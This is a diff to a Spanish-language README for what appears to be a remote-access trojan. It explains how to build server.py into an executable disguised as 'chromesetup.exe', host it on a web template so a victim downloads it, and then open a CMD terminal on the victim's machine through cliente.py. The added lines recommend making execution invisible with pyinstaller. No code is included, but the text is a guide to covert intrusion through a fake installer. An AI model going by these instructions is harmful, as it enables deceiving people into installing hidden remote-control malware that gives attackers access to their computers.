@@ -17,4 +17,7 @@ Foto realizada en Notepad++
 ## Este repositorio tiene una plantilla web en la que tienes que añadir chromesetup.exe (Convirtiendo el server.py a exe)
 
 
-Cuando la víctima descargue Chromesetup.exe de este repositorio, usar "python -m http.server" (Recomendado) por que os sale la hora de la descarga de ese archivo para que tú puedas ejecutar el .py del cliente y poder acceder a una terminal de CMD >:-)
+Cuando la víctima descargue Chromesetup.exe de este repositorio, en una de las ventanas, te saldrá una solicitud, y cuando lo ejecute, saldrá otra solicitud en la otra ventana y ya te podrás conectar a través de cliente.py >:)
+
+# IMPORTANTE!!!! (Recomendable)
+Hacer que al ejecutarlo sea todo invisible con pyinstaller
